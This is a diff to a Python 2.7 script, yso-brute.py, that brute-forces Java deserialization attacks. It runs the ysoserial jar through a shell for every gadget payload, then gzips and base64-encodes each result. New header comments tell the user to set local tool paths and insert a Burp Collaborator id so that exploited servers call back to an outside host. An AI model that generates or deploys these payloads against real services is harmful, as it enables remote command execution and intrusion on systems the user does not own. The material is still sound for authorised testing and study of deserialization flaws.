@@ -1,5 +1,11 @@
 #
-# Usage: $ python2.7 yso-brute.py 2>/dev/null 
+# Usage: $ python2.7 yso-brute.py 2>/dev/null
+#
+# Edit the followings before using it
+#   1. replace /path/to/java with your local java path
+#   2. replace /path/to/ysoserial-master-SNAPSHOT.jar with your ysoserial.jar path
+#   3. replace your.collaborator.net with your burp-collaborator-id
+#
 #
 
 import os 
@@ -49,7 +55,7 @@ def generate(name, cmd):
     for payload in payloads: 
         final = cmd.replace('REPLACE', payload) 
         print('Generating ' + payload + ' for ' + name + '...') 
-        command = os.popen('/path/to/java -jar /path/to/ysoserial-master-SNAPSHOT.jar ' + payload + ' "' + final + '"' + '| gzip -f') #gzip encode 
+        command = os.popen('/path/to/java -jar /path/to/ysoserial-master-SNAPSHOT.jar'+' ' + payload + ' "' + final + '"' + '| gzip -f') #gzip encode 
         result = command.read() 
         command.close() 
         base64_encode = base64.b64encode(result) #base64 encode 
